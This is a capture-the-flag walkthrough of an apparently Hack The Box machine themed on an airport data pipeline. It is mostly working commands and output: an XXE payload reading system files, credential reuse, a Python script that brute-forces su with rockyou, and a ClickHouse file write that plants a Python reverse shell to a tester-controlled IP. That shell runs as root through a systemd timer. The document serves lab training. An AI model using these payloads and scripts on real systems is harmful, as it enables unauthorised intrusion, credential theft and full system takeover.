# Stream

<img width="1593" height="283" alt="image" src="https://github.com/user-attachments/assets/6a6e63a5-1a20-48b3-8923-a42c707230cc" />

---

## Nmap scan

```ruby
└─$ nmap -sCV -Pn 10.129.110.120
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-10 19:02 UTC
Nmap scan report for 10.129.110.120
Host is up (0.59s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp   open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://api.htb-airport.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
8081/tcp open  http    Uvicorn
|_http-server-header: uvicorn
|_http-title: Site doesn't have a title (application/json).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.53 seconds

```


## on port `80` found `api.htb-airport.htb`

<img width="1546" height="387" alt="image" src="https://github.com/user-attachments/assets/c4517547-13de-4dc4-8a1f-08837229644b" />

```json
service	"terminal-edge-gateway"
status	"operational"
version	"1.0.0"
node	"tg-edge-01"
region	"eu-central-1"
uptime	"2d 8h 30m 21s"
upstreams	
flight-data-service	"UP"
boarding-control	"UP"
gate-assignment	"UP"
passenger-manifest	"UP"
message	"All terminal gateway systems are operational."
timestamp	"2026-10-09T19:07:31.388742292Z"
```

## on port `8081` found 

<img width="1412" height="395" alt="image" src="https://github.com/user-attachments/assets/4bf0674f-8e5a-4453-8d73-6f3bb1bb99ef" />

```json
service	"AIDX flight-leg ingest"
what	"Accepts AIDX XML for processing"
how	
method	"POST"
path	"/feeds/aidx"
content_type	"application/xml"
max_bytes	262144
required_elements	
0	"IATA_AIDX_FlightLegNotifRQ"
1	"Originator"
2	"FlightLeg"
3	"LegIdentifier"
note	"Ingest does not parse. Full validation happens downstream."
health	"GET /health"
```


## fuzz on `8081`  


```
gobuster dir -u http://10.129.110.120:8081 \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -t 30

```

```json 
/docs                 (Status: 200) [Size: 1021]
```

## on `/docs` found 

<img width="1590" height="434" alt="image" src="https://github.com/user-attachments/assets/e2ccc7db-b133-4e30-aa5b-9d9b1505882d" />




## try send simple xml to `/feeds/aidx` before try `XXE`

```
curl -X POST http://10.129.110.120:8081/feeds/aidx \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<IATA_AIDX_FlightLegNotifRQ xmlns="http://www.iata.org/IATA/2007/00" Version="12.1">
  <Originator Code="TEST"/>
  <FlightLeg>
    <LegIdentifier>
      <Airline Code="TEST"/>
      <FlightNumber>123</FlightNumber>
      <DepartureAirport>AAA</DepartureAirport>
      <ArrivalAirport>BBB</ArrivalAirport>
      <OriginDate>2026-10-10</OriginDate>
    </LegIdentifier>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>'

```

<img width="1707" height="321" alt="image" src="https://github.com/user-attachments/assets/5358bf84-1c8b-4b89-abb4-d15e3afb4fb3" />

## lets see if there is another subdomain in `htb-airport.htb`

```
gobuster vhost -u http://htb-airport.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain --domain htb-airport.htb

```

<img width="1425" height="399" alt="image" src="https://github.com/user-attachments/assets/1d0f59e1-a928-4661-81b0-ddae4e542df2" />

```json
db.htb-airport.htb Status: 200 [Size: 4]
```

## we found `db.htb-airport.htb` it's running ClickHouse an open-source column-oriented database.


<img width="1919" height="793" alt="image" src="https://github.com/user-attachments/assets/9ec6f150-c823-40ba-bd8d-e3938dc7f4b3" />



The ClickHouse HTTP interface is **notoriously powerful** and often misconfigured.


  

## Test Basic ClickHouse Access

`Query 1 — Version and current user:`

```
curl -s 'http://db.htb-airport.htb/?query=SELECT%20version(),%20currentUser()'
```


<img width="1178" height="278" alt="image" src="https://github.com/user-attachments/assets/3543ac5e-60d7-4484-8da6-47e97b755a24" />

ClickHouse requires authentication. The error message is actually **very helpful**  it tells us exactly where the password would be on the server:

> The password for default user is typically located at `/etc/clickhouse-server/users.d/default-password.xml`


---

## fuzzing on our subdomains

```
gobuster dir -u http://db.htb-airport.htb/ -w /usr/share/wordlists/dirb/common.txt -t 30
```

<img width="1637" height="612" alt="image" src="https://github.com/user-attachments/assets/c8a39558-ca89-471d-81a0-6c629563a399" />

```
gobuster dir -u http://api.htb-airport.htb/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 30
```

<img width="1306" height="385" alt="image" src="https://github.com/user-attachments/assets/b3090b12-87d8-42ad-a4fb-6f92f52ef901" />

## found dump in **`http://api.htb-airport.htb/actuator/heapdump`**

<img width="1008" height="99" alt="image" src="https://github.com/user-attachments/assets/1c6eb1af-1836-41c5-940a-6299e3af92e0" />

## in it found `SHA256` hash and salt for `svc_events`

```sql
CREATE USER IF NOT EXISTS "SVC_EVENTS" SALT '9ecfa690ece76f28' HASH '2b1de774041d23956a432a0e6631382562f8c3c351e5900b5c07764b7348ecfe' ADMIN
```

<img width="1437" height="364" alt="image" src="https://github.com/user-attachments/assets/d43e66df-d5b1-4f8f-811b-86b3bf7e1f83" />

## but we don't need to crack it because we have it as plain text 

<img width="968" height="154" alt="image" src="https://github.com/user-attachments/assets/492e1bad-d5c4-4f14-8401-9c4ad2b7999a" />

## Test the credentials

```
curl -s "http://db.htb-airport.htb/?user=svc_events&password=<PASSWORD>&query=SELECT%201"
```

<img width="1067" height="135" alt="image" src="https://github.com/user-attachments/assets/5907d5c8-9c60-4843-ba80-6f52b22f481b" />


## List databases

```
# List databases
curl -s "http://db.htb-airport.htb/?user=svc_events&password=<PASSWORD>&query=SHOW%20DATABASES"

# List tables in partner_feed
curl -s "http://db.htb-airport.htb/?user=svc_events&password=<PASSWORD>&query=SHOW%20TABLES%20FROM%20partner_feed"
```

<img width="1249" height="280" alt="image" src="https://github.com/user-attachments/assets/573f7f64-a8f0-48be-9632-0c6ee3876bdb" />





## let's go back When we POST to `/feeds/aidx` , the response is: 

```json
{"accepted":true,"topic":"aidx.flightleg.raw.v1"}
```


> The word **"topic"** is Kafka terminology. The name follows a Kafka topic naming convention. So we know:

- The XML is **not parsed by the ingest** — it's just dropped onto a queue.
    
- Something else reads from that queue.

> and form note on port `8081` we know 

`note	"Ingest does not parse. Full validation happens downstream."`

- This confirms there's a downstream consumer. The downstream consumer is what actually parses the XML.


## from db :

```
flightleg_json               ← parsed result
flightleg_json_kafka         ← Kafka engine table (source)
flightleg_json_mv            ← materialized view (moves data from kafka table to json table)
flightleg_raw                ← raw data
flightleg_raw_kafka          ← Kafka engine table for raw
flightleg_raw_mv             ← materialized view for raw
```

> ClickHouse Kafka engine table is a special table that directly consumes messages from a Kafka topic.





## now let's send XXE payload 


```
cat > /tmp/xxe-passwd.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<IATA_AIDX_FlightLegNotifRQ TransactionIdentifier="xxe1" TimeStamp="2026-10-10T19:30:00Z" Version="22.1">
  <Originator CompanyShortName="TST" Code="TS"/>
  <FlightLeg>
    <LegIdentifier>
      <Airline>&xxe;</Airline>
      <FlightNumber>999</FlightNumber>
      <DepartureAirport>XXX</DepartureAirport>
      <ArrivalAirport>YYY</ArrivalAirport>
    </LegIdentifier>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
EOF


curl -s -X POST http://<TARGET_IP>:8081/feeds/aidx \
  -H "Content-Type: application/xml" \
  --data-binary @/tmp/xxe-passwd.xml
```


## Query XXE :


```
curl -s "http://db.htb-airport.htb/?user=svc_events&password=<PASSWORD>" \
  --data-binary "SELECT transaction_id, airline FROM partner_feed.flightleg_json WHERE transaction_id = 'xxe1'"
```

<img width="1583" height="320" alt="image" src="https://github.com/user-attachments/assets/90d7fed2-f9c4-4a35-b34a-989bd9eaab61" />

```
svc-infra:x:1000:1000:,,,:/home/svc-infra:/bin/bash
clickhouse:x:996:987::/nonexistent:/bin/false
martin_cole:x:1001:1001:,,,:/home/martin_cole:/bin/bash
```



## let's try to enumerate the system 


Read `/etc/systemd/system/kafka.service`** 

```bash

sed 's|file:///etc/hostname|file:///etc/systemd/system/kafka.service|;s|hostname1|svc1|' /tmp/xxe-hostname.xml > /tmp/xxe-svc.xml
```

Read `/proc/mounts`** to see the filesystem layout:

```bash

sed 's|file:///etc/hostname|file:///proc/mounts|;s|hostname1|mounts1|' /tmp/xxe-hostname.xml > /tmp/xxe-mounts.xml
```

Read `/etc/environment` and `/etc/profile`** 

```bash

sed 's|file:///etc/hostname|file:///etc/environment|;s|hostname1|env1|' /tmp/xxe-hostname.xml > /tmp/xxe-env.xml
```

 Read `/proc/1/cmdline` or look for a Kafka process:**

```bash

sed 's|file:///etc/hostname|file:///proc/1/cmdline|;s|hostname1|cmdline1|' /tmp/xxe-hostname.xml > /tmp/xxe-cmdline.xml
```

 After sending each, query the results:**

```bash

curl -s "http://db.htb-airport.htb/?user=svc_events&password=<PASSWORD>" \
  --data-binary "SELECT transaction_id, airline FROM partner_feed.flightleg_json WHERE transaction_id IN ('svc1','mounts1','env1','cmdline1')"
```

<img width="1449" height="323" alt="image" src="https://github.com/user-attachments/assets/140ceb7d-522a-49f0-8957-91e44facdbff" />

## Read the Kafka Config


```
sed 's|file:///etc/hostname|file:///opt/kafka_2.13-4.3.1/config/server.properties|;s|hostname1|kafka1|' /tmp/xxe-hostname.xml > /tmp/xxe-kafka.xml

curl -s -X POST http://10.129.79.103:8081/feeds/aidx \
  -H "Content-Type: application/xml" \
  --data-binary @/tmp/xxe-kafka.xml
```


**`QUERY`**

```
curl -s "http://db.htb-airport.htb/?user=svc_events&password=<PASSWORD>" \
  --data-binary "SELECT airline FROM partner_feed.flightleg_json WHERE transaction_id = 'kafka1' FORMAT Vertical" | head -80
```


## WE FOUND `user_svc_infra` PASSWORD

<img width="1252" height="169" alt="image" src="https://github.com/user-attachments/assets/e9439f2a-6a7f-4a09-b649-e01dc7a54e20" />

## CONNECT VIA SSH 

```
ssh svc-infra@10.129.79.103
```

**`BINGO`**

<img width="950" height="176" alt="image" src="https://github.com/user-attachments/assets/231c8b2b-e19c-4153-85dd-c213088391ed" />



> No obvious direct privilege escalation path was identified, as there are no unusual SUID binaries, writable cron jobs, or exploitable shared group permissions. Another user, martin_cole, has a valid shell, but direct SSH password authentication does not appear to be a viable option externally. However, switching to martin_cole via su from the existing svc-infra SSH session is possible, making a password audit using rockyou.txt against the local su authentication the intended route.



```
#!/usr/bin/env python3
# /tmp/su_brute.py

import pexpect
import sys

TARGET = "10.129.79.103"       # 
SVC_USER = "svc-infra"
SVC_PASS = "<PASSWORD>"
TARGET_USER = "martin_cole"
WORDLIST = "/usr/share/wordlists/rockyou.txt"

child = pexpect.spawn(f"ssh -o StrictHostKeyChecking=no {SVC_USER}@{TARGET}",
                      timeout=15, encoding="utf-8")
child.expect("password:")
child.sendline(SVC_PASS)
child.expect(r"\$")

with open(WORDLIST, "r", encoding="latin-1", errors="ignore") as f:
    for i, line in enumerate(f):
        pw = line.strip()
        if not pw:
            continue

        child.sendline(f"su {TARGET_USER}")
        idx = child.expect(["Password:", pexpect.TIMEOUT], timeout=5)
        if idx != 0:
            continue

        child.sendline(pw)
        idx2 = child.expect(["su: Authentication failure", r"\$", pexpect.TIMEOUT], timeout=5)
        if idx2 == 1:
            print(f"\n[+] FOUND PASSWORD for {TARGET_USER}: {pw}")
            child.interact()
            sys.exit(0)
        elif idx2 == 2:
            print(f"[!] timeout on password: {pw}")

        if i % 500 == 0 and i > 0:
            print(f"[*] tried {i} passwords...")

print("\n[-] Password not found in wordlist")
```


<img width="862" height="135" alt="image" src="https://github.com/user-attachments/assets/e5130fd5-5cac-44c1-a9e0-cb2cd7772633" />



## PrivEsc


### found in home directory call `backup` :

<img width="1414" height="424" alt="image" src="https://github.com/user-attachments/assets/d7784b6a-bddf-4636-a7ca-60b0c2ee1c7c" />


**`~/backups/`** — a **Kopia repository** in `martin_cole`'s home directory.

Kopia is a **backup tool**. Those files (`kopia.blobcfg.f`, `kopia.repository.f`, `.shards`, `p/`, `q/`, `s/`, `x/`) are the **internal storage structure** of a Kopia repository


## found in `/opt/ops` script  **`dlq_drainer.py`**

<img width="1002" height="130" alt="image" src="https://github.com/user-attachments/assets/8959b2ba-91c5-421c-a1e1-51e89f77f4d5" />


## DLQ Drainer Script Summary

The `dlq_drainer.py` script consumes failed messages from the Kafka Dead Letter Queue (DLQ) topic `aidx.flightleg.dlq.v1`.

**Key Functions:**

- **Consume:** Reads failed messages from Kafka for a configurable duration (10 seconds by default).
- **Extract Error Reason:** Retrieves the failure reason from the Kafka message headers.
- **Quarantine:** Saves each raw message as an XML file in `/var/lib/aidx/quarantine/`.
- **Format:** Runs an external formatter to extract the message size, XML root tag, and preview.
- **Log:** Inserts failure details into the ClickHouse table `aidx_ops.failed_ingest`.
- **Commit:** Commits the Kafka message offset after attempting to save and record the message.



> ### If that script runs as root, we can overwrite it (via ClickHouse's FILE write privilege with the default user) with a reverse shell, and when the drainer fires, the reverse shell runs as root.

```
systemctl list-timers --all 2>/dev/null | grep -iE "dlq|aidx|drain"
systemctl status aidx-dlq-drainer 2>/dev/null
systemctl cat aidx-dlq-drainer.service
```

<img width="1556" height="399" alt="image" src="https://github.com/user-attachments/assets/d37a49e2-d544-45aa-83fd-5d6503586f73" />



- A **root-run systemd timer** that fires every **2 minutes**
    
- That timer executes **`/opt/ops/dlq_drainer.py`** as **root**
    
- The drainer script, when it runs, calls:
    
    ```python
    
    subprocess.run(["python3", "/var/lib/clickhouse/user_files/aidx_quarantine.py"], input=raw, ...)
    ```
    
     it **runs the file at that path as root**, with the Kafka message as stdin


> If we can replace the file /var/lib/clickhouse/user_files/aidx_quarantine.py with a reverse shell, the root-run drainer will execute our shell as root every time it fires.

---

#### `**Question 1  Can we write to that file?**`

`martin_cole` probably can't (permission denied). **But** — the file lives in **ClickHouse's `user_files` directory**, and the ClickHouse **`default` user has `WRITE ON FILE`** privilege, which lets it write to that directory via SQL.

**So the answer is: yes, but only via ClickHouse** — using the `default` user's credentials.




#### `**Question 2 How do we get the `default` password?**`

`martin_cole` has a Kopia backup repository in `~/backups/` containing a snapshot of `ch-logs`. This backup was passwordless — `kopia repository connect filesystem --path=/home/martin_cole/backups` connects with an empty password.



#### `**Question 3  How do we trigger the drainer to run our file?**`

The drainer consumes from a Kafka topic `aidx.flightleg.dlq.v1` (DLQ = dead-letter queue). **Messages land there when XML fails validation downstream.** So we send **malformed XML** to the ingest service, it ends up in the DLQ, and the next drainer run picks it up — executing our overwritten `aidx_quarantine.py` as root.


## restore kopia snapshot

```
kopia snapshot list --all
```

<img width="1426" height="68" alt="image" src="https://github.com/user-attachments/assets/ad062d2b-63fc-4486-a09f-02a8e3f638e2" />

## kopia snapshot

```
kopia snapshot ls kc43a7ec76aeac204b305df2b777304d1
mkdir -p /tmp/ch-logs-restore
```



The snapshot `kc43a7ec76aeac204b305df2b777304d1` contains ClickHouse server logs. Restoring it reveals:

```
kopia snapshot restore kc43a7ec76aeac204b305df2b777304d1 /tmp/ch-logs-restore/
grep -iE "IDENTIFIED BY|password" /tmp/ch-logs-restore/*.log
```

The ClickHouse error log captured a failed ALTER USER statement with a syntax error — and the error message includes the entire query, including the plaintext password:


```
ALTER USER default IDENTIFIED BY '<PASSWORD>'
```

<img width="1544" height="420" alt="image" src="https://github.com/user-attachments/assets/4d29fff6-df44-4d0c-b556-616e591261f9" />


## Verify:

```
curl -s "http://db.htb-airport.htb/?user=default&password=<PASSWORD>&query=SELECT%201"
```

<img width="974" height="141" alt="image" src="https://github.com/user-attachments/assets/b3547c5f-6092-4584-8416-efcd8c8ab727" />


## SICNE we have the password let's Overwrite the Formatter Script via ClickHouse

```
# Set these
KALI_IP=10.10.16.34    # <-- your tun0 IP
PORT=4444
CH_PASS='<PASSWORD>'

curl -s "http://db.htb-airport.htb/?user=default&password=$CH_PASS" \
  --data-binary "INSERT INTO TABLE FUNCTION file('aidx_quarantine.py', 'LineAsString') SETTINGS engine_file_truncate_on_insert=1 VALUES
('import socket,subprocess,os'),
('s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)'),
('s.connect((\"$KALI_IP\",$PORT))'),
('os.dup2(s.fileno(),0)'),
('os.dup2(s.fileno(),1)'),
('os.dup2(s.fileno(),2)'),
('subprocess.call([\"/bin/bash\",\"-i\"])')"
```

## Verify the File Was Overwritten

```
curl -s "http://db.htb-airport.htb/?user=default&password=$CH_PASS" \
  --data-binary "SELECT * FROM file('aidx_quarantine.py', 'LineAsString') FORMAT TabSeparated"
```

<img width="1161" height="239" alt="image" src="https://github.com/user-attachments/assets/45f324ea-17b6-436c-bddb-4881a16c2829" />

## Trigger the DLQ Drainer

```
TARGET=<ip-of-target>

# The XML is deliberately missing its closing tag to force it into the DLQ
curl -s -X POST http://$TARGET:8081/feeds/aidx \
  -H "Content-Type: application/xml" \
  --data-binary '<?xml version="1.0" encoding="UTF-8"?><IATA_AIDX_FlightLegNotifRQ TransactionIdentifier="rootshell1" TimeStamp="2026-10-13T20:40:00Z" Version="22.1">
<Originator CompanyShortName="TST" Code="TS"/>
<FlightLeg><LegIdentifier><Airline>HTB</Airline><FlightNumber>999</FlightNumber><DepartureAirport>XXX</DepartureAirport><ArrivalAirport>YYY</ArrivalAirport></LegIdentifier></FlightLeg>'
```

<img width="1674" height="264" alt="image" src="https://github.com/user-attachments/assets/b330d2a7-c02f-4ae6-921a-90a6eddb3e01" />


# bingoo

<img width="960" height="186" alt="image" src="https://github.com/user-attachments/assets/91fc096b-bade-49e3-bf5f-4074ac493f2d" />



| #   | Stage                         | What we found                                                                                              |
| --- | ----------------------------- | ---------------------------------------------------------------------------------------------------------- |
| 1   | Recon                         | Found `api.htb-airport.htb`, `db.htb-airport.htb`, ingest on 8081                                          |
| 2   | Initial XXE discovery         | `<Airline>&xxe;</Airline>` → output lands in ClickHouse `partner_feed.flightleg_json`                      |
| 3   | `svc_events` credentials      | Extracted from Spring Boot **heap dump** (`/actuator/heapdump`, 52 MB) → `<PASSWORD>`                      |
| 4   | XXE file reads                | `/etc/passwd`, Kafka `server.properties`, `/etc/environment` — all via XXE → ClickHouse                    |
| 5   | `svc-infra` SSH               | SASL password from Kafka config ('<PASSWORD>') reused as OS password                                       |
| 6   | `martin_cole`                 | `su` brute-force → `tinkerbell` (rockyou) → **user flag**                                                  |
| 7   | Root path discovery           | `/opt/ops/dlq_drainer.py` + systemd unit confirmed `User=root`                                             |
| 8   | Kopia backup                  | Passwordless repo in `~/backups/` → restored ClickHouse logs                                               |
| 9   | ClickHouse `default` password | Leaked in a failed `ALTER USER` error log line → `<PASSWORD>`                                              |
| 10  | **UDF-style overwrite**       | ClickHouse `FILE` write → overwrote `/var/lib/clickhouse/user_files/aidx_quarantine.py` with reverse shell |
| 11  | **Trigger**                   | Malformed XML → DLQ topic → drainer ran our script **as root**                                             |














